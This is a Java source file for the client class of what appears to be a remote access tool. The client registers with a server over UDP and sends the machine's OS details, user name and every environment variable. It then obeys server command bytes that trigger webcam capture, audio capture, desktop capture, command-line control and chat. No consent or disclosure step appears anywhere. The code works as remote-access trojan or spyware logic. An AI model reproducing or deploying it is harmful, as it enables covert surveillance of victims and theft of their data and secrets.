package Client;

import Client.Features.*;
import Handler.Message;
import Handler.ObjectHandler;
import Handler.InfoHandler;
import Tools.Network.NetworkInterface;

import java.io.IOException;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.time.LocalDateTime;
import java.util.Map;
import java.util.Objects;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Client extends NetworkInterface {

    public static void main(String[] args) throws SocketException {
        Client client = new Client(8000);
        Runtime.getRuntime().addShutdownHook(new Thread(client::disposeAll));
    }

    private static final ExecutorService threadListener = Executors.newSingleThreadScheduledExecutor();

    private final Random rand = new Random(LocalDateTime.now().getSecond());
    private final int id = rand.nextInt(1000000);

    private final InfoHandler infoHandler;
    private final ObjectHandler<Message<?>> clientObjectHandler;

    private final CameraCapture cameraCapture = new CameraCapture(0);
    private final AudioCapture audioCapture = new AudioCapture();
    private final Chat chat = new Chat();
    private final CMDControl cmdControl = new CMDControl();
    private final DesktopCapture desktopCapture = new DesktopCapture();

    public Client(int PORT) throws SocketException {
        super(PORT);
        socket = new DatagramSocket();
        infoHandler = new InfoHandler(socket);
        clientObjectHandler = new ObjectHandler<>();
        threadListener.execute(listener());
    }

    private Runnable listener() {
        return () -> {
            try {
                String value = String.valueOf(id);
                Message<String[]> info = () -> new String[]{String.valueOf(CommandByte.START_BYTE), value};
                byte[] infoData = Objects.requireNonNull(clientObjectHandler.writeObjects(info));
                socket.connect(address, PORT);
                infoHandler.send(infoData, infoData.length);
                socket.disconnect();
                byte[] dataReceived = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
                if (dataReceived[0] == CommandByte.CONFIRMATION_BYTE) {
                    System.out.println("Client connected to a server!");
                    threadListener.execute(infoListener());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        };
    }

    private Runnable infoListener() {
        return () -> {
            Message<String[]> osInfoClient = () -> new String[]
                    {       System.getProperty("os.name"),
                            System.getProperty("os.version"),
                            System.getProperty("os.vendor"),
                            System.getProperty("os.arch"),
                            System.getProperty("user.name")
                    };
            Message<Map<String, String>> osInfoSystem = System::getenv;

            byte[] objInfo = Objects.requireNonNull(clientObjectHandler.writeObjects(osInfoClient));
            byte[] objSystem = Objects.requireNonNull(clientObjectHandler.writeObjects(osInfoSystem));

            try {
                socket.connect(address, PORT);
                infoHandler.send(objInfo, objInfo.length);

                infoHandler.send(objSystem, objSystem.length);
                socket.disconnect();

                if (infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort())[0] == CommandByte.INFO_ACHIEVED_BYTE) {
                    threadListener.execute(featureListener());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        };
    }

    private Runnable featureListener() {
        return () -> {
            outer:
            while (true) {
                try {
                    byte[] data = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
                    switch (data[0]) {
                        case CommandByte.CAMERA_BYTE -> {
                            cameraCapture.startFeature();
                            byte[] imageData = cameraCapture.getImageAsByteArray();
                            infoHandler.send(imageData, imageData.length, infoHandler.getAddress(), infoHandler.getPort());
                        }
                        case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
                        case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
                        case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
                        case CommandByte.CHAT_BYTE -> chat.startFeature();
                        case CommandByte.STOP_BYTE -> {
                            break outer;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                sleep(1000 / 60);
            }
        };
    }

    @Override
    public void disposeAll() {
        threadListener.shutdown();
        super.disposeAll();
        socket.disconnect();
        socket.close();
    }
}

